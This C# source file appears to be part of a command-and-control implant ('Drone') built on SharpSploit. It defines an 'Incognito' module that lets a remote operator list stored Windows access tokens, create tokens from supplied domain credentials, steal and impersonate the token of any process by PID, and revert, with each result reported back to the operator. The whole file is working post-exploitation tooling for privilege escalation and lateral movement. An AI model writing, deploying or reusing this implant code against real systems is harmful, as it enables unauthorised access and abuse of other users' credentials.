using System.Collections.Generic;
using System.Linq;
using System.Threading;

using Drone.Models;
using Drone.Modules;
using Drone.SharpSploit.Credentials;
using Drone.SharpSploit.Generic;

namespace Drone
{
    public class TokenModule : DroneModule
    {
        public override string Name => "Incognito";

        public override List<Command> Commands => new List<Command>
        {
            new("list-tokens", "List tokens in the token store", ListTokens),
            new("delete-token", "Remove and dispose this token from the token store", DisposeToken, new List<Command.Argument>
                {
                    new("handle", false)
                }),
            new ("use-token", "Use a token in the token store", UseToken, new List<Command.Argument>
            {
                new("handle", false)
            }),
            new("make-token", "Create and impersonate a token with the given credentials", MakeToken, new List<Command.Argument>
            {
                new("DOMAIN\\username", false),
                new("password")
            }),
            new ("steal-token", "Duplicate and impersonate the token of the given process", StealToken, new List<Command.Argument>
            {
                new("pid", false)
            }),
            new("rev2self", "Drop token impersonation", RevertToSelf)
        };
        
        private readonly SharpSploitResultList<Token> _tokens = new();

        private void ListTokens(DroneTask task, CancellationToken token)
        {
            var tokens = _tokens.ToString();
            Drone.SendResult(task.TaskGuid, tokens);
        }
        
        private void DisposeToken(DroneTask task, CancellationToken token)
        {
            var handle = task.Arguments[0];
            var tok = GetTokenFromStore(handle);

            tok.Dispose();
            _tokens.Remove(tok);
        }
        
        private void UseToken(DroneTask task, CancellationToken token)
        {
            var handle = task.Arguments[0];
            var tok = GetTokenFromStore(handle);

            if (tok is null)
            {
                Drone.SendError(task.TaskGuid, "Could not find token with that Guid.");
                return;
            }

            if (tok.Impersonate())
            {
                Drone.SendResult(task.TaskGuid, $"Successfully impersonated token for {tok.Identity}.");
                return;
            }
            
            Drone.SendError(task.TaskGuid, "Failed to impersonate token.");
        }
        
        private void MakeToken(DroneTask task, CancellationToken token)
        {
            var userdomain = task.Arguments[0].Split('\\');
            
            var domain = userdomain[0];
            var username = userdomain[1];
            var password = task.Arguments[1];

            var tok = new Token();
            
            if (!tok.Create(domain, username, password))
            {
                Drone.SendError(task.TaskGuid, $"Failed to create token for {domain}\\{username}.");
                return;
            }
            
            _tokens.Add(tok);
            Drone.SendResult(task.TaskGuid, $"Created and impersonated token for {tok.Identity}.");
        }
        
        private void StealToken(DroneTask task, CancellationToken token)
        {
            if (!uint.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID.");
                return;
            }

            var tok = new Token();
            var result = tok.Steal(pid);

            if (!result)
            {
                Drone.SendError(task.TaskGuid, $"Failed to steal token for PID {pid}.");
                return;
            }
            
            _tokens.Add(tok);
            Drone.SendResult(task.TaskGuid, $"Successfully impersonated token for {tok.Identity}.");
        }
        
        private void RevertToSelf(DroneTask task, CancellationToken token)
        {
            var result = Token.Revert();
            if (result) return;
            
            Drone.SendError(task.TaskGuid, "Failed to revert token.");
        }
        
        private Token GetTokenFromStore(string handle)
            => _tokens.FirstOrDefault(t => t.Handle.Equals(handle));
    }
}